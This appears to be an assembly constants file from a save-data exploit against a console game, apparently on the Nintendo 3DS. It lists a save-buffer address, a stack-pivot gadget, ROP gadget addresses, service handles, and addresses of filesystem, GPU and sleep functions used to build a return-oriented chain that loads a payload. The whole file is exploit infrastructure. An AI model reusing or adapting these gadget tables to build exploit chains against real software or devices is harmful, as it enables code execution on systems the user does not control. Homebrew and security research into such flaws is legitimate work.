SAVE0_BUFFER_PTR equ 0x003B3A4C
OBJECT_BUFFER_PTR equ (SAVE0_BUFFER_PTR + object_buffer)
OBJECT_BUFFER_REF_PTR equ (SAVE0_BUFFER_PTR + object_reference)
ROP_PTR equ (SAVE0_BUFFER_PTR + rop)
DUMMY_PTR equ (SAVE0_BUFFER_PTR - 0x100)

LINEAR_BUFFER equ (0x31000000)
PAYLOAD_VA equ (0x00105000)

STACK_PIVOT_PTR equ 0x00101264 ; ldmdbge r0, {r0, r2, r3, r7, ip, sp, pc}

ROP_IRON_POP_R0PC equ 0x002232d0
ROP_IRON_POP_R1PC equ 0x00221440
ROP_IRON_POP_R4R5PC equ 0x0010d3b8
ROP_IRON_POP_R2R3R4R5R6PC equ 0x001f5ad0
ROP_IRON_POP_R4R5R6R7R8R9R10R11PC equ 0x0010d878
ROP_IRON_NOP equ 0x0010d454
ROP_IRON_POP_R4LR_BX_R1 equ 0x0024b0d0

ROP_IRON_LDRR0R0_POPR4PC equ 0x0014a870

IRON_FS_HANDLE equ 0x0035DC38
IRON_GSPGPU_HANDLE equ 0x00380884

IRON_FSUSER_OPENFILEDIRECTLY equ 0x001e8b9c ; r0 : &handle, r1 : &file_handle, r2 : transaction, r3 : archive_id, sp+0 : archive_path_type, sp+4 : *archive_path, sp+8 : archive_path_length, sp+0xC : path_type, sp+0x10 : path, sp+0x14 : pathlength, sp+0x18 : openflags, sp+0x1c : attributes
IRON_FSUSER_READ equ 0x00248418 ; r0 : &handle, r1 : &bytes_read, r2 : offset_low, r3 : offset_high, sp+0 : *outbuf, sp+4 : size
IRON_GSPGPU_GXTRYENQUEUE equ 0x001cf0cc
IRON_GSPGPU_FLUSHDATACACHE equ 0x001aad3c
IRON_SVC_SLEEPTHREAD equ 0x001dec0c
